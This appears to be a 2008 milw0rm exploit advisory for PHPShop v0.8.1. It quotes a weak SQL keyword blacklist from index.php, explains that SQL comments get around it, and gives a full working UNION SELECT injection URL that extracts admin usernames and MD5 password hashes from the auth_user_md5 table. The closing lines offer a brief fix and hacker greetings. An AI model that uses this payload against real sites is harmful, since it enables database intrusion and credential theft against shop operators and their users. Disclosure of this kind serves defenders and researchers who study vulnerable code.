@@ -1,0 +1,55 @@
+Vendor  : PHPShop
+Webiste : http://www.phpshop.org
+Version : v0.8.1
+Author: the redc0ders / theredc0ders[at]gmail[dot]com
+Condition: magic_quote_gpc = off , in php.ini setting
+
+Details :
+==========
+
+  Vulnerable Code in index.php near lines 98 - 128
+   [code]
+ // basic SQL inject detection
+   $my_insecure_array = array('keyword' => $_REQUEST['keyword'],
+                  'category_id' => $_REQUEST['category_id'],
+                  'product_id' => $_REQUEST['product_id'],
+                  'user_id' => $_REQUEST['user_id'],
+                  'user_info_id' => $_REQUEST['user_info_id'],
+                  'page' => $_REQUEST['page'],
+                  'func' => $_REQUEST['func']);
+                  
+   while(list($key,$value)=each($my_insecure_array)) {
+      if (stristr($value,'FROM ') ||
+          stristr($value,'UPDATE ') ||
+          stristr($value,'WHERE ') ||
+          stristr($value,'ALTER ')  ||
+          stristr($value,'SELECT ')  ||
+          stristr($value,'SHUTDOWN ') ||
+          stristr($value,'CREATE ') ||
+          stristr($value,'DROP ') ||
+          stristr($value,'DELETE FROM') ||
+          stristr($value,'script') ||
+          stristr($value,'<>') ||
+          stristr($value,'=') ||
+          stristr($value,'SET '))
+              die('Please provide a permitted value for '.$key);
+   }
+ [/code]
+
+  The script check if $my_insecure_array contain 'SELECT ','UPDATE ' ...etc 
+
+  so WORD+space, and this can be easily bypassed using comments like 
+  POC : select/**/input1,input2...
+
+Exemple to inject admin username and md5 hash password : http://website/phpshop/?page=shop/flypage&product_id=-3'+UNION+select/**/null,null,null,null,null,password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,username/**/from/**/auth_user_md5/*
+
+
+  
+  Solution :
+ simply remove spaces in stristr() function or activate magic_quotes_gpc in php.ini
+ 
+ Greetz : Hacker1 - ToXiC350 - S4MI - Miyyet - Pynsso - Amigo_BM and All Moroccan Hackers =)
+
+>From Morocco : JIB L3EZZ WELLA K7AZZ !
+
+# milw0rm.com [2008-02-02]
